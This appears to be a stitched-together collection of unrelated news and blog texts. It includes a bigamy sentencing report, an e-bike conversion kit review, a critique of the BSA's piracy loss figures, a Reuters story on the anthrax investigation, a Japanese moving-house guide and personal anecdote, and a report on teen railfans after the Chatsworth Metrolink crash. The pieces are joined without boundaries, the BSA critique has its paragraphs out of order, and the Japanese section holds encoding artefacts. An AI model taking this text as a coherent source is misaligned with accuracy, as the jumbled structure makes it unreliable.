Sweetman was convicted of bigamy at High Wycombe Magistrates ' Court on August 26 this year and committed to Crown Court for sentencing .
Judge Connor ordered Sweetman to complete 100 hours of unpaid work for the benefit of the community .
Sweetman , whose new girlfriend attended the sentencing , was also ordered to pay £ 220 in costs to the court .
Sales of electric bikes have spun into high gear this year — some merchants reporting a 6000 % increase in sales .
This is good news , because , for short trips , the efficiency and convenience of electric bikes is hard to beat .
You may have heard that in the U.S. , 40 % of all trips are made within two miles of the home , and 50 % of workers commute five miles or less to work .
Currently , the top-rated electric bike conversion kit on Amazon is the Currie Technologies Power Kit , which gets an average of 4.3 out of 5 stars from reviewers .
This kit converts a 26 - inch mountain or comfort bike into an electric bike .
What you get is a hybrid bike that can be powered by pedaling , or by engaging an electric motor .
Using the kit , you can go 15 minutes on electric power alone ( the range can be doubled with an optional second battery pack ) .
The pack include a lead - acid battery , which requires 6 to 8 hours to recharge when completely depleted .
The Currie Technologies Power Kit is available from Amazon for about $ 300 .
The Currie Kit is a good entry - level kit , but if your are interested in a lighter kit with better performance you may want to try a kit with a lithium - ion battery , such as the Hill Topper or the Bionx .
The Bionx kit has been around the longest , and is generally regarded as the best quality conversion kit , selling for $ 1600 .
Note that lithium - ion battery packs cost more — $ 815 for the Hill Topper , which about as low as you ’ll get for a lithium - based conversion kit .
Another good electric bike I ’ve tried is from a family - run company called AmpedBikes .
The founder , Danny L. Ray , was unhappy with the quality of the kits he was getting from China , so he visited China and found a company that were willing to build a kit to his specifications , using the parts he chose .
The AmpedBikes kits incorporate a brushless 36V 500W electric hub , and can be installed on almost any bike with 26 ″ wheels .
Ray says the kits can be installed in about 20 minutes , and he an installation video on his website to show how it ’s done .
A Detailed Explanation Of How The BSA Misleads With Piracy Stats
from the and - on - and - on - it - goes dept
The report counts every unauthorized piece of software as a lost sale .
You have to dig through separate PDFs to find this info , but when you finally get to the methodology it states :
The software losses are based on the piracy rate and equal the value of software installed not paid for .
That 's a huge , and obviously incorrect assumption .
Many of the folks using the software likely would not have paid for it otherwise , or would have used cheaper or open source options instead .
The report makes no effort to count the positive impact of unauthorized use of software in leading to future software sales .
This is something that even Microsoft has admitted has helped the company grow over time .
But according to the BSA 's report , this does n't matter .
The report also proudly notes : " Software piracy also has ripple effects in local communities . "
However , " ripple effects " are easily disproved as double or triple counting the same dollar .
Using ripple effects like that inflates the final number by two or three times .
In the link here , Tim Lee explains this ( in reference to an MPAA study done by IPI , but it applies here to the BSA study done by IDC as well ) :
If a foreigner gives me $ 1 , and I turn around and buy an apple from you for a dollar , and then you turn around and buy an orange from another friend for a dollar , we have n't thereby increased our national wealth by $ 3 .
At the beginning of the sequence , we have an apple and an orange .
At the end , we have an apple , an orange , and a dollar .
Difference : one dollar .
No matter how many times that dollar changes hands , there 's still only one dollar that was n't there before .
Yet in IPI - land , when a movie studio makes $ 10 selling a DVD to a Canadian , and then gives $ 7 to the company that manufactured the DVD and $ 2 to the guy who shipped it to Canada , society has benefited by $ 10 +$ 7 + $ 2=$ 19 .
Yet some simple math shows that this is nonsense : the studio is $ 1 richer , the trucker is $ 2 , and the manufacturer is $ 7 .
Shockingly enough , that adds up to $ 10 .
What each participant cares about is his profits , not his revenues .
This is a huge fallacy that the BSA an IDC refuse to acknowledge .
When I discussed it with them in May , they insisted that they only wanted to talk about piracy rates , not the loss number .
I wonder why ...
Next , if they 're going to count ripple effects in one direction , it 's only fair to also count them in the other direction .
That is , they complain that :
Lost revenue to technology companies also puts a strain on their ability to invest in new jobs and new technologies .
For example , the $ 11.4 billion in piracy losses to software vendors and service providers in the eight states would have been enough to fund more than 54,000 tech industry jobs .
But what they do n't acknowledge is the ripple effects in the other direction .
That is , if ( going by their assumption , remember ) every company that uses an unauthorized copy of software had to pay for it , that would represent $ 11.4 billion in money that all of those other companies could not use to fund jobs at those companies .
What about all of those jobs ?
The BSA / IDC stat on lost tax revenue also miscounts on the point above , since it includes the lost income tax revenue from those 54,000 lost jobs , but does not count the equivalent income tax revenue from those other jobs .
In fact , in the fine print , the report notes : " Employment losses are calculated from revenue losses , and only apply to employment in the IT industry , not IT professionals in end - user organizations .
Tax revenue losses are calculated from revenue losses ( VAT and corporate income tax ) and employment losses ( income and social taxes ) . "
In other words , the income tax losses only count one side of the equation and totally ignore the lost income tax revenue from the lost jobs on the other side of the equation .
Oops .
It seems likely that the eventual tax benefits of the unauthorized use of software is most likely to greatly outweigh the lost tax revenue elsewhere .
That 's because the use of software within industries is a productivity tool that increases overall productivity and output , which would increase taxes beyond just the income taxes of the employees .
The study , of course , ignores this point .
Worst of all , the report seems to assume that direct software sales are the only business model for the software industry , ignoring plenty of evidence from companies that have adopted business models that embrace free software -- generating billions of dollars for the economy ( and in taxes ) .
And that 's what this really comes down to .
It 's a business model issue .
If others started adopting these business models as well , there would n't be any " losses " at all .

A couple months ago , when the Business Software Alliance ( BSA ) released its latest stats on " piracy , " it 's VP of anti-piracy , Neil MacBride , gave me a call to discuss my earlier complaints about the organizations methodology .
Needless to say , we did not see eye - to - eye , and the phone call did little to resolve our differences .
I 'm still hopeful that eventually the BSA will recognize that it 's doing more damage to its own position by publishing obviously bogus numbers .
So , with the organization releasing another bogus stat today , it 's time to explain why it 's wrong and misleading .
Today 's report is an attempt to get the government involved in protecting BSA member companies ' business model , by claiming that the US is losing out on $ 1.7 billion in tax revenue due to " pirated " software .
And , of course , it comes with a lovely quote from Mr. MacBride : " The most tragic aspect is that the lost revenues to tech companies and local governments could be supporting thousands of good jobs and much - needed social services in our communities . "
And the BSA is even so kind as to quantify what that ( not really ) lost tax revenue could do : " For example , the lost tax revenues to state and local governments -- an estimated $ 1.7 billion -- would have been enough to build 100 middle schools or 10,831 affordable housing units ; hire 24,395 experienced police officers ; or purchase 6,335 propane - powered transit buses to reduce greenhouse gas emissions .
" Except that this is almost entirely incorrect and it's relatively easy to show why :
Oh , and just for good measure , the reportfalsely claims that : " What many do n't realize or do n't think about is that when you purchase software , you are actually purchasing a license to use it , not the actual software . "
That 's not exactly true and goes directly against a recent court ruling that said the opposite and goes through a detailed explanation for why a piece of sold software is a sale with restrictions , rather than a license , using previous court precedents .
Most of these points have been made to the BSA and IDC in the past , and both organizations chose not to address them .
The fact that they 're continuing to use these obviously false numbers and methodology to now push for the government to prop up an obsolete business model should be seen as troubling not just for the dishonesty of it , but for theimpact it will have on the software industry and our economy as a whole .

WASHINGTON ( Reuters ) - A senator targeted in the deadly 2001 anthrax attacks said on Wednesday he is convinced that the man believed to have carried it out did not act alone .
Slideshow ( 7 images )
Senate Judiciary Committee Chairman Patrick Leahy , a Vermont Democrat , voiced doubts to FBI Director Robert Mueller at a hearing in which other lawmakers called for a stepped - up review of the FBI ’s case against U.S. Army scientist Bruce Ivins .
Last month the FBI and Justice Department said Ivins , an anthrax expert who killed himself in July , was solely responsible for the mailing of anthrax - laced envelopes to politicians and media organizations shortly after the September 11 attacks .
The mailings killed five people and sickened 17 .
One of the letters was addressed to Leahy , but it was misdirected to another building and he was unharmed .
“ If he ( Ivins ) was the one who sent the letter , I do not believe in any way shape or manner that he is the only person involved in this attack on Congress or the American people , ” Leahy told Mueller .
“ I believe there are others out there .
I believe there are others who can be charged with murder . ”
Leahy did not explain his views , and a spokeswoman did not immediately respond to a request for elaboration .
FBI officials have said the investigation is over and would be formally closed soon .
But Mueller told Leahy the bureau would remain open to considering new evidence that pointed to additional suspects .
“ We have looked at every lead and followed every lead to determine if anyone else was involved and will continue to do so , ” Mueller said .
Ivins ’ death and the FBI ’s disclosure that new DNA analysis techniques helped crack the case have sparked questions over the reliability of the evidence against Ivins .
His lawyer says he was innocent .
Mueller on Tuesday announced that the FBI had asked the National Academy of Sciences to review the scientific evidence , but some lawmakers said it was not enough .
Republican Sen. Charles Grassley of Iowa sought a congressional probe , and Republican Sen. Arlen Specter of Pennsylvania urged Mueller to let Congress name some members of the review panel .
“ There has to be some alternative process capable of ensuring , in a way that a trial could have , that the FBI got it right , ” Grassley said .
FBI investigators mistakenly focused for years on another scientist , Steven Hatfill .
Hatfill was never charged and the government agreed in June to pay him $ 5.85 million to settle a lawsuit .
Hatfill was seen in the audience for Wednesday ’s hearing but he did not address the lawmakers .

引越しと繁忙 期
引越しには繁忙期と通常期があります。
繁忙期は１年のうちで最も引越し業者が忙しい時期なので通常期よりも費用が高くなります。
繁忙期とはいわゆる３月前後のことで、大学生の合格発表が２月でそれから４月の新学期までに一人暮らしや寮に入るために引越しをする人が多い時期です。
ほかにも新社会人になるために地方から上京してくる人、春の人事異動で転勤してきたサラリーマン一家と、とにかく引越しする人が多いのです。
もしできるなら繁忙期の引越しは避けた方が無難です。
業者を探すのも大変ですし、費用も高いので、できれば他の月にしたほうがいいと思います。
どうしても繁忙期に引越しするのであれば、準備のスピードが大切です。
まだ大丈夫・・・と契約を先延ばししていると予約がいっぱいになってしまい契約ができなくなることが本当にあるのです。
そんな時期ですから早めに動いて、少しでもお得に引越ししてくださいね。
引越しの手 順
引越し業者に見積もりを取るタイミングは、新居が決まってからがオススメです。
なぜなら、新居の階数やエレベーターの有無などの物件の情報がなければ、正確な金額を計算することができないからです。
そして荷物は早めに梱包しましょう。あまり使わないものや季節外れの洋服などから梱包しましょう。
不用品があれば、売るあげる捨てるなどしてできるだけ引越し前に処分してください。不要品の送料もかかりますからもったいないです。
荷物が多ければ多いほど、引越し料金が高くなるのでできるだけ余裕のあるうちに計画的に処分してくださいね。
市外へ引越しする方は 「転出届」を市町村役場に出します。
これは引越しの2週間前から提出することが可能です。
ついでに国民健康保険や国民年金、児童手当など役所関係のものがあれば、住所変更について必要なものがないか聞いておくと無駄がありませんね。
電気・ガス・水道は引越し日までは前の住所で使えるようにしてもらい、その日までの費用を日割りで精算してもらうように手配しましょう。
詳しいことは電話にて確認してください。
そして同じ市内での引越しなら同じ会社で手続きができますので、引越し日から新居で使えるようにしてもらってくださいね。
最寄りの郵便局に行って引越し日からは新居に荷物を転送してもらう手配をしてください。
1年間は転送してくれるのでその間に引越しした新住所を知り合いに伝えておきましょう。
引越し当日は家具や家電の配置を引越し業者に指示してくださいね。
貴重品・高級品・現金・通帳・印鑑・貴金属・時計・パソコン・データ類・下着・見られたくないものなどは自分で運びます。
これらは引越し業者では運べないものですし、もし破損しても保険が利かないものもありますから自分管理で行いましょう。
引越し日から2週間以内に市内引越しなら「転居届」を、市外引越しなら「転入届」を提出してください。
これで選挙など役所からのお知らせが届きます。
運転免許証やパスポートなどの身分証明書になるものや、各種の保険・銀行カード・クレジットカードなどの住所変更手続きを行ってくださいね。
引越しと初期費 用
引っ越しにはお金がかかりますが、中でも物件の契約料と引っ越し費用が高額です。
賃貸物件を契約する際にかかる費用としては、以下のようなものがあります。
敷金・礼金・仲介手数料・家賃２〜３か月分・連帯保証会社利用費用・火災保険・カギの交換費用などです。
敷金は物件の退去の際に汚れた壁紙などを補修する費用で、入居の時に貸主に預ける形になっています。
部屋を綺麗に使って修理する箇所が少なければ、退去時に使わなかったお金が返還されることもあります。
契約内容によっては返還しないことになっている場合もありますので、契約書をしっかり確認しましょう。
礼金は貸主へのお礼として昔から慣習的に支払われていたもので、指定されている場合は支払う必要があります。
ただ最近は礼金ゼロという物件も見られるように。
部屋を探している人が少しでも入りやすくするために、礼金ゼロにしている貸主さんもいるようです。
物件によっては２か月分、３か月分の家賃を先払いを求める貸主もいます。
いま家賃の滞納が社会問題となっていますので、まとめて先払いさせることでちゃんと家賃を支払う能力がある人かどうか確認する意味合いもあります。貯金がないと引越しも出来ませんね。
しかし逆に１か月フリーレント、つまり１か月分の家賃が無料ですからぜひうちの物件にお入りくださいという貸主もいます。
考え方は人それぞれですね。
仲介手数料は物件を紹介してくれた不動産会社に支払う費用です。
これは法律で決まったものはありませんので、家賃１カ月分だったり、家賃の数パーセントだったりと会社によってちがいます。
昔は賃貸契約の際に連帯保証人として親の名前などを契約書にサインさせたりしたものですが、最近は一人っ子や一人っ子などいろいろな事情があって連帯保証人を用意できない人が増えました。
そこで連帯保証会社利用費用を支払って保証会社に依頼する人も多くなりました。
賃貸物件は集合住宅なので、必ず火災保険に加入しなければなりません。
例えば隣部屋の方が火元で火災が起こった場合でも自分が火災保険に加入していなければ、火事を出した相手に賠償を請求することはできないのです。
もらい火でも自己責任ですから、火災保険の加入は必須です。
物件に入居する際に鍵の交換を行いましょう。
もし前の住人がスペアキーを多めに作っていた場合、やはり他人が自分の家のカギを持っていることになります。
場所も知っているわけですから、気持ちのいいものではありませんね。
鍵の交換費用は１．５〜２万円くらいです。
このように契約時にかかる費用は物件を扱う不動産会社や貸主さんの考え方によってかなり差があります。
契約する前にしっかり確認しましょう。

引越しをしたら、ご近所にあいさつに行きましょう。
どこのお宅まで行けばいいのでしょう。
マンションやアパートであれば左右と上下の部屋の方に、一軒家であれば向こう３軒両隣のお宅まで行くのが一般的です。
この他にもマンションの管理人さん、大家さんも近くに住んでいるようなら、挨拶しておきましょう。
一軒家の場合は、ゴミ当番のこともありますので自治会長さんなどにも挨拶しておくと安心かもしれません。
挨拶に行くタイミングですが、引越ししたらできるだけ早くが一般的です。
引越し当日、遅い時間になるようであれば翌日に行きましょう。
引越しの時は案外長時間トラックが止まって作業をしていたり、足音が響きますから早めに挨拶に行って、印象を良くしておきましょう。
何か手土産を用意しておくと行きやすいです。
高価なものでなく、５００〜１０００円程度のもので結構です。
人気があるのは洗剤やタオルなどの消耗品、お菓子やコーヒー、紅茶などの食品です。
第一印象は大事にしたいですね。
引越しのオプションとは？
引越し業者にはオプションサービスというのがあります。
このオプションサービスは有料なので、必要なものだけ選んでカスタマイズすることが可能です。
どんなものがあるのでしょう？
・エアコンの取外・取 付
・消毒・殺虫サービ ス
・ハウスクリーニン グ
・新聞の手 配
・御挨拶品の準 備
・ピアノの輸 送
・ピアノの調 律
・特殊品の輸 送
・バイクや車の陸送サービス
・ペットの輸 送
・盗聴器の発見サービ ス
・造園サービ ス
・荷物の一時預か り
・ハウスリフォー ム
・ネット申し込 み
・耐震グッズ施 行
・資材回 収
・不用品の処 分
いろいろありますね 。
エアコンの移設を自分で手配するとなると、引越し前に取り外してもらって、引越し後に取り付けを手配しなければならないため面倒なのです。
しかしオプションで 「エアコンの移設」をお願いしておけば、引越し業者がこの面倒な手配を代理でやってくれるので便利です。
ピアノをお持ちの方はピアノの輸送にチェックを入れて見積もりを依頼してくださいね。
ピアノの運送はどこの引越し業者でも扱っているわけではないので、オプションになるのです。
実に今どきなのが盗聴器を探すオプションです。
最近の盗聴器は小型化、軽量化、そしてコンセント直結だったりするので、気が付かない限りプライバシーが外部にさらされたままになります。
気になる方は調べてもらっておくと安心ですね。
どんなサービスが必要なのかも業者を決める目安になります。
引越しと粗大ゴ ミ
家の中に使わなくなった家具や壊れた家電がそのままになっていませんか？
引越しはこれらを処分する大きなチャンスです。
粗大ゴミの定義 は 「 一辺が５０ｃｍ以上、もしくは重さが１０ｋｇ以上あるもの」です。
それと石油ファンヒータやストーブ、ガスコンロ、電子レンジは大きさに関係なく粗大ゴミとなります。
また家電リサイクル法で定められた家電を捨てたい時は、家電を購入した家電量販店か新しく買い替えをする家電量販店でのリサイクルが必要です。
家電リサイクル法で定められた家電というのはエアコン、テレビ(ブラウン管、液晶・プラズマ)、冷蔵庫・冷凍庫、洗濯機・衣類乾燥機です。
これらのリサイクルにはリサイクル料がかかります。
もし家電を買ったお店が近くない場合、買い替えを検討していない、買ったお店がすでに廃業している場合など困った時は、お住いの自治体のリサイクルセンターに相談してみましょう。
では一般的な粗大ゴミはどうやって廃棄するのでしょう？
粗大ゴミの廃棄方法にはＡ：回収に来てもらう（有料）、B：自分で持って行く（無料）という２つの方法があります。
�@回収に来てもらう方法 まず粗大ゴミの処理施設（リサイクルセンターなど）に電話で連絡をして、回収に来てもらえる日を予約します。
次にスーパーやコンビニで売っている「粗大ゴミシール」を買って、捨てたい家財に貼り付けます。
この粗大ゴミシールは回収手数料であり、捨てたい家財の種類によって値段が違います。
粗大ゴミ１つにつき粗大ゴミシールが１枚必要であり、同じ場所に置いておいてもシールのないものは回収してくれません。
あとは指定日時までに指定場所に置いておけば、業者が回収に来てくれます。
� A自分で持って行く方 法 自分で持って行く場合でも電話での予約が必要です。
いつ何時にどんなものをいくつ持って行くかを聞かれますので、言い忘れないようにメモを作っておきましょう。
予約した日時に粗大ごみの処理センターに持っていきます。
身分証を提示した後に車ごと粗大ゴミの計量を行います。
粗大ゴミを下ろした車で再び車の重さを量り、捨てた粗大ゴミの重さを計算します。
自分で持って行く場合（個人の場合）は粗大ごみシールを貼る必要はありませんが、１００ｋｇを超えると数百円程度の手数料がかかる場合があります。
粗大ゴミの処分方法はお住いの自治体によって違いがあるため、詳しい事は役所のホームページでご確認ください。

結婚を機に引っ越 し
昨年の１２月に結婚し、今年の１月に旦那と一緒に住むことになりました。
私と旦那はもともとプチ遠距離で、それぞれ別の県に住んでいたのですが、結婚を機に、旦那の家の近くに、二人で暮らせる家を借りることにしたんです。
その時
私は妊娠７か月。赤ちゃんとの暮らしも視野に入れたお家を考え、一階の角部屋に決めました。
私は妊婦だし、引っ越しの荷物の準備などは全部引っ越し業者に任せようと思っていたのですが、旦那は「お金がないから自分たちでする」といい、引っ越し業者は頼まず。
荷造りはどうするんだろうと思ってみていたのですが、一向にする気配なし。結局私一人で自分の家と旦那の家の荷造りをする羽目になりました。
引っ越し当日は、旦那の家族も手伝いに来てくれたのですが、妊婦なんだから座ってていいよと言いつつも・・・という感じで、結局重たい荷物を運ばされ、夜は腰痛で動けなくなりました。
その後も段ボールを片付ける気配すら見せない旦那。結局荷解きも私一人でやりました。
この時は 、 「 こんなに重たいもの一人で運ばせて！！流産したら一生恨んでやる！！！」
と思ってたのですが、無事赤ちゃんも産まれ、今ではみんなで仲良く暮らしてます♪

The tribute reads like something that might be written for a rock star who died too soon : “ We will never forget you .
Let your warm - hearted soul RIP . ”
Those words , however , part of a YouTube video tribute , were written to a train engineer .
They were written to Robert M. Sanchez , who was at the helm of the Metrolink train that slammed into an oncoming freight train in Chatsworth , killing 25 people , one week ago .
And they were written by his fans , which is not as unusual as it sounds .
Earlier this week , investigators announced that Sanchez ’s cellphone records showed he had been text - messaging while on duty the day of the crash .
A group of local teens -- railroad enthusiasts , some of whom considered Sanchez something of a mentor -- are believed to have been on the other end of some of those messages .

In the days since the crash , the teens have gone largely into hiding , shielded mostly by their parents from a wave of media attention and public interest .
In private , it is clear that they are crushed .
“ It ’s just devastating , ” said Mark Speer , 53 , a film editor who lives in Chatsworth and whose son , also named Mark , was part of the group of teen train enthusiasts .
The boys comprised a circle of friends who described themselves as dedicated “ railfans ” -- rail enthusiasts who often scoured the streets and hills to find choice spots for filming videos of passing trains , which they posted on the Internet , and who often participated in model railroad clubs .
Several were aspiring engineers , and they often rode the Metrolink out of Chatsworth -- the station that Metrolink 111 left before it crashed -- just for fun .
They had developed extensive knowledge of the rails , including schedules and characteristics of certain trains .
Recently , they got to know Sanchez , who apparently swapped information with some of the teens , communicating by text messages .

Rail officials say it ’s common for enthusiasts , particularly teenagers , to strike up friendships with engineers .
Most of these railfans were earnest , smart kids , still in middle school and high school , who , according to their Internet postings , liked Xbox and water polo , Kobe and Kanye .
Today , they are connected by three things : an abiding love of trains ; a sense that they are misunderstood and maligned by “ railhaters ” who mock their hobby ; and anguish over the death of Sanchez and his passengers .
They splashed into the public ’s consciousness after the crash , when some of them went to the site and spoke with a television news reporter .
One of the teens showed the reporter his cellphone , still containing short messages from Sanchez .
“ It was an innocent thing to memorialize ” Sanchez , said Speer -- a way to show the public that Sanchez was a good man and a dedicated professional who managed to find the time to interact with the public while doing his job .
By the time the story reached the airwaves it had become something very different and very stark : that Sanchez was sending text messages while on the job .

The teens -- who believe that factors other than text - messaging contributed to the crash -- feel blindsided and burned by the TV report and the ensuing public response , Speer said .
The worst of it came on Internet sites , where people anonymously attacked the teenagers -- even suggesting that they had played a role in the tragedy .
“ It ’s just too much , ” one of the teens , who gave his name only as Brian , said in an e-mail Thursday night .
Although they are saying virtually nothing in public , on the Internet -- where the teens ’ fascination with trains began , where some of them found each other and bonded in the first place -- their anguish is seeping out .
There appear to be 10 or 15 teen railfans who have posted a variety of responses to the train crash on the Internet .
Some are friends in what they call “ the real world ” -- on the streets of Chatsworth or in the San Bernardino Mountains , where they meet to take photographs and videos of trains .
Some are friends only in cyberspace .

Shortly after the crash , several posted a tribute to Sanchez on YouTube .
They included two 14 - year - old boys who have since been asked for their phone records by the National Transportation Safety Board because they are believed to have been text - messaging Sanchez on the day of the crash .
The boys and their families are cooperating with the investigation .
( The younger Speer never sent or received messages from Sanchez . )
The tribute video includes fuzzy pictures the teens took of Sanchez at the helm of a Metrolink train and reveals their extensive knowledge about trains -- noting , among other things , that the video was taken several days before the crash but includes the actual set of cars used that day , including Locomotive No. 855 .
“ You take care Rob , ” the text of the tribute says .
“ Godspeed .
And God bless you . ”

Since then , additional reaction to the train crash has sprung up -- in online chats between the teens and in additional postings to YouTube and MySpace pages .
One teen , an Internet - only acquaintance of the local boys , used Microsoft Train Simulator , a popular computer railroad program known in the railfan community as “ MSTS , ” to recreate the accident .
“ This video is for education purposes , ” reads a disclaimer at the beginning of the video posted on YouTube .
“ If you take this offensively please close the video now . ”
The simulation , set to the tune of the Journey song “ Open Arms , ” begins with the Metrolink 111 departing Union Station in downtown Los Angeles and is so detailed you can see the rust on the ceiling of the platform .
It ends with a long shot of the train rounding the curve above the Chatsworth station and cuts off at the moment of impact .

A block of text then scrolls over a black screen : “ We will love all those who died .
Pray for the injured .
And remember what happened that day to learn . ”
Another teen , who goes by the YouTube handle “ AmcalAJ , ” filmed himself sitting on the floor of his bedroom , then posted the footage as part of a video he called “ Never Forget . ”
Looking into a camera , he spoke directly to the teens who swapped text messages with Sanchez , offering them his condolences .
“ I ’m just really devastated , ” he said .
“ It ’s really hard to lose a friend . ”
